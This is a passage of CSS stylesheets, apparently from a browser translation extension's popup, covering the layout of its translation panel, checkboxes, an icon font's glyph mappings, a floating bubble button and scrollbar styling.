      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-10%"]:after {
        left: 10%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] {
      transform: translateX(-20%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-20%"]:after {
        left: 20%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] {
      transform: translateX(-30%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-30%"]:after {
        left: 30%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] {
      transform: translateX(-40%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-40%"]:after {
        left: 40%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] {
      transform: translateX(-50%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-50%"]:after {
        left: 50%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] {
      transform: translateX(-60%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-60%"]:after {
        left: 60%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] {
      transform: translateX(-70%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-70%"]:after {
        left: 70%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] {
      transform: translateX(-80%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-80%"]:after {
        left: 80%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] {
      transform: translateX(-90%); }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"] > .Translator__arrow__3eIZZ, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4[data-translateX="-90%"]:after {
        left: 90%; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl {
      z-index: 1;
      display: flex;
      height: 30px;
      background-color: #2EC4B6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5 {
        display: inline-block;
        width: 30px;
        height: 30px;
        outline: none;
        flex-shrink: 0;
        color: #FDFFFC;
        font-size: 18px;
        line-height: 30px;
        text-align: center;
        text-shadow: 0 1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:focus {
          color: #cc7f16; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5:active:not(.Translator__disabled__Cwgfb) {
          text-shadow: 0 -1px #20897f; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__btn__2x0P5.Translator__disabled__Cwgfb {
          color: #b8ebe6; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV {
        vertical-align: top;
        display: inline-flex;
        margin: 5px 5px;
        flex-grow: 1;
        justify-content: center; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > i {
          margin-left: 2px;
          color: #FDFFFC; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw {
          position: relative;
          display: inline-flex; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select:hover {
            border: none;
            box-shadow: rgba(1, 22, 39, 0.078) 0 1px 0, rgba(253, 255, 252, 0.74) 0 1px 2px inset;
            border-radius: 5px;
            color: #011627;
            text-shadow: none;
            background-image: none;
            background-color: rgba(253, 255, 252, 0.9);
            cursor: pointer;
            -webkit-appearance: menulist;
            font-size: 12px;
            background-color: #FDFFFC; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__true-select__1H8eq {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            opacity: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__header__WILTl > .Translator__languages__veNRV > .Translator__container__1XAUw > select.Translator__fake-select__TiLW- {
            vertical-align: top;
            min-width: 40px;
            pointer-events: none; }
    .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo {
      position: relative;
      min-height: 30px;
      padding: 16px 5px; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translated-from__EL6tK {
        position: absolute;
        top: 4px;
        right: 8px;
        color: #2EC4B6;
        font-size: 12px;
        cursor: help; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw {
        max-height: 116px;
        margin-bottom: 7px;
        padding: 0 8px;
        font-style: italic;
        word-break: break-word;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__pronunciation-btn__1kbhJ {
          display: inline-block;
          width: 22px;
          margin-right: 8px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription-loader__3c8Vr {
          margin-top: 5px;
          text-align: center;
          cursor: help; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__original__vxGtw > .Translator__transcription__T_fKH {
          margin-top: 5px;
          margin-left: 30px;
          font-style: italic; }
      .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j {
        max-height: 250px;
        padding: 0 8px;
        overflow: auto; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U:not(:first-child) {
          margin-top: 10px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr {
          display: flex;
          border-bottom: 1px dotted #b8ebe6;
          justify-content: flex-end;
          color: #73d7ce;
          font-size: .9em;
          font-style: italic; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg {
            flex-grow: 1;
            text-align: left; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i.Translator__upside-down__2XYYt:before {
              transform: rotate(180deg);
              display: inline-block; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg > i:before {
              margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus {
              color: #2EC4B6; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:hover > i, .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__pos-header__12tEr > .Translator__expand-terms__3MAyg:focus > i {
                transform: scale(1.2);
                display: inline-block; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ {
          display: flex;
          min-height: 28px;
          padding: 4px 0;
          align-items: center;
          cursor: pointer; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI {
            display: inline-flex;
            width: 14px;
            height: 14px;
            margin-right: 5px;
            border: 1px solid #011627;
            border-radius: 2px;
            outline: none;
            flex-shrink: 0;
            justify-content: center;
            align-items: center; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i {
              display: none;
              color: #011627;
              font-size: 11px; }
              .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI > i:before {
                margin: 0; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI:focus {
              border-color: #cc7f16; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__checkbox__cgTFI.Translator__checked__REDlo > i {
              display: inline; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ:hover > .Translator__checkbox__cgTFI {
            box-shadow: inset 0 0 4px #73d7ce; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > .Translator__term__3UT78 {
            min-height: 20px;
            max-height: 116px;
            flex-grow: 1;
            word-break: break-word;
            overflow: auto; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__pos-wrapper__2Bd1U > .Translator__term-line__gW8FJ > input {
            text-overflow: ellipsis;
            white-space: nowrap;
            overflow: hidden;
            width: 0;
            padding: 0;
            border: none;
            flex-grow: 1;
            font-size: 15px;
            line-height: 20px; }
        .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK {
          display: flex;
          width: 14px;
          height: 14px;
          margin-top: 7px;
          border: 1px solid #011627;
          border-radius: 2px;
          outline: none;
          justify-content: center;
          align-items: center; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i {
            color: #1f837a;
            font-size: 10px; }
            .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK > i:before {
              margin: 0; }
          .Translator__wrapper__2qJID > .Translator__translation-popup__2_mD4 > .Translator__content-body__2mvzo > .Translator__translations__29R5j > .Translator__add-custom__2QhtK:focus {
            border-color: #cc7f16; }
</style><style type="text/css">.Button__btn__1lr0f:not(.Button__keep-cursor__V97qw) {
  cursor: pointer; }
  .Button__btn__1lr0f:not(.Button__keep-cursor__V97qw).Button__disabled__38AlQ {
    cursor: not-allowed; }
</style><style type="text/css">@charset "UTF-8";
/* stylelint-disable */
.icon-pencil:before {
  content: '\E800'; }

/* 'î €' */
.icon-ok:before {
  content: '\E801'; }

/* 'î ' */
.icon-ccw:before {
  content: '\E802'; }

/* 'î ‚' */
.icon-globe:before {
  content: '\E803'; }

/* 'î ƒ' */
.icon-info-circled:before {
  content: '\E804'; }

/* 'î „' */
.icon-cancel:before {
  content: '\E805'; }

/* 'î …' */
.icon-edit:before {
  content: '\E806'; }

/* 'î †' */
.icon-plus:before {
  content: '\E807'; }

/* 'î ‡' */
.icon-bookmark:before {
  content: '\E808'; }

/* 'î ˆ' */
.icon-settings:before {
  content: '\E809'; }

/* 'î ‰' */
.icon-down-1:before {
  content: '\E80A'; }

/* 'î Š' */
.icon-up-1:before {
  content: '\E80B'; }

/* 'î ‹' */
.icon-heart:before {
  content: '\E80C'; }

/* 'î Œ' */
.icon-export:before {
  content: '\E80D'; }

/* 'î ' */
.icon-keyboard-2:before {
  content: '\E80E'; }

/* 'î Ž' */
.icon-ok-circled:before {
  content: '\E814'; }

/* 'î ”' */
.icon-cancel-circled:before {
  content: '\E817'; }

/* 'î —' */
.icon-translate:before {
  content: '\E822'; }

/* 'î ¢' */
.icon-anki:before {
  content: '\E823'; }

/* 'î £' */
.icon-anki-1:before {
  content: '\E825'; }

/* 'î ¥' */
.icon-acc-basic:before {
  content: '\E830'; }

/* 'î °' */
.icon-acc-subscriber:before {
  content: '\E831'; }

/* 'î ±' */
.icon-rb-ico:before {
  content: '\E834'; }

/* 'î ´' */
.icon-cog:before {
  content: '\E840'; }

/* 'î¡€' */
.icon-login:before {
  content: '\E845'; }

/* 'î¡…' */
.icon-logout:before {
  content: '\E846'; }

/* 'î¡†' */
.icon-arrow-down-bold:before {
  content: '\E859'; }

/* 'î¡™' */
.icon-scissors:before {
  content: '\E88A'; }

/* 'î¢Š' */
.icon-home:before {
  content: '\E8C2'; }

/* 'î£‚' */
.icon-mute:before {
  content: '\E900'; }

/* 'î¤€' */
.icon-sound:before {
  content: '\E901'; }

/* 'î¤' */
.icon-left-bold:before {
  content: '\E929'; }

/* 'î¤©' */
.icon-down:before {
  content: '\E92C'; }

/* 'î¤¬' */
.icon-up:before {
  content: '\E92F'; }

/* 'î¤¯' */
.icon-switch:before {
  content: '\E937'; }

/* 'î¤·' */
.icon-graduation-cap-1:before {
  content: '\E96A'; }

/* 'î¥ª' */
.icon-floppy:before {
  content: '\E971'; }

/* 'î¥±' */
.icon-facebook:before {
  content: '\E98E'; }

/* 'î¦Ž' */
.icon-webstore:before {
  content: '\EC24'; }

/* 'î°¤' */
.icon-vk:before {
  content: '\EC71'; }

/* 'î±±' */
.icon-mail:before {
  content: '\ECD3'; }

/* 'î³“' */
.icon-graduation-cap:before {
  content: '\EE02'; }

/* 'î¸‚' */
.icon-emo-happy:before {
  content: '\EE63'; }

/* 'î¹£' */
.icon-emo-unhappy:before {
  content: '\EE66'; }

/* 'î¹¦' */
.icon-spin1:before {
  content: '\EE77'; }

/* 'î¹·' */
.icon-bookmark-empty:before {
  content: '\F097'; }

/* 'ï‚—' */
.icon-filter:before {
  content: '\F0B0'; }

/* 'ï‚°' */
.icon-paste:before {
  content: '\F0EA'; }

/* 'ïƒª' */
.icon-angle-double-left:before {
  content: '\F100'; }

/* 'ï„€' */
.icon-angle-double-right:before {
  content: '\F101'; }

/* 'ï„' */
.icon-angle-left:before {
  content: '\F104'; }

/* 'ï„„' */
.icon-angle-right:before {
  content: '\F105'; }

/* 'ï„…' */
.icon-angle-down:before {
  content: '\F107'; }

/* 'ï„‡' */
.icon-minus-squared:before {
  content: '\F147'; }

/* 'ï…‡' */
.icon-export-alt:before {
  content: '\F14D'; }

/* 'ï…' */
.icon-expand-right:before {
  content: '\F152'; }

/* 'ï…’' */
.icon-plus-squared:before {
  content: '\F196'; }

/* 'ï†–' */
.icon-language:before {
  content: '\F1AB'; }

/* 'ï†«' */
.icon-sliders:before {
  content: '\F1DE'; }

/* 'ï‡ž' */
.icon-trash:before {
  content: '\F1F8'; }

/* 'ï‡¸' */
.icon-clone:before {
  content: '\F24D'; }

/* 'ï‰' */
.icon-question-circle-o:before {
  content: '\F29C'; }

/* 'ïŠœ' */
.icon-user-circle:before {
  content: '\F2BD'; }

/* 'ïŠ½' */
.icon-twitter:before {
  content: '\F309'; }

/* 'ïŒ‰' */
.icon-gplus:before {
  content: '\F30F'; }

/* 'ïŒ' */
.icon-linkedin:before {
  content: '\F318'; }

/* 'ïŒ˜' */
[class^="icon-"]:before,
[class*=" icon-"]:before {
  display: inline-block;
  width: 1em;
  margin-right: .2em;
  margin-left: .2em;
  /* For safety - reset parent styles, that can break glyph codes*/
  font-family: "rbicon";
  font-variant: normal;
  font-weight: normal;
  font-style: normal;
  text-transform: none;
  text-align: center;
  text-decoration: inherit;
  -webkit-font-smoothing: antialiased;
  speak: none; }

/* stylelint-enable */
</style><style type="text/css">.Pronouncer__loading__2zqT4,
.Pronouncer__loading__2zqT4 > i {
  cursor: wait; }
</style><style type="text/css">@keyframes Bubble__zoom-in-out__1nY8w {
  0% {
    transform: translateX(-50%) scale(0.9); }
  50% {
    transform: translateX(-50%) scale(1.1); }
  100% {
    transform: translateX(-50%) scale(1); } }

.Bubble__bubble__2jKwp {
  position: absolute;
  z-index: 1009;
  transform: translateX(-50%);
  width: 28px;
  height: 28px;
  border-radius: 4px;
  box-shadow: 0 0 8px rgba(1, 22, 39, 0.3);
  background-color: #2EC4B6;
  animation: Bubble__zoom-in-out__1nY8w 200ms ease-out;
  transition: box-shadow 150ms ease-out; }
  .Bubble__bubble__2jKwp > i {
    display: inline-block;
    width: 100%;
    height: 100%;
    color: #FDFFFC;
    font-size: 18px;
    line-height: 28px;
    text-align: center;
    text-shadow: 0 1px #20897f; }
    .Bubble__bubble__2jKwp > i:before {
      margin: 0; }
  .Bubble__bubble__2jKwp:active > i {
    text-shadow: 0 -1px #20897f; }
</style><style type="text/css">::-webkit-scrollbar {
  width: 8px; }

::-webkit-scrollbar-thumb {
  border-radius: 8px;
  background-color: rgba(0, 0, 0, 0.45); }

main {
  all: initial;
  font-size: 16px;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }

* {
  box-sizing: border-box; }

input,
button,
select {
  outline: none;
  font-family: Georgia, Trebuchet MS, Helvetica, Helvetica Neue;
  -webkit-font-smoothing: antialiased; }
</style></template></div></body></html>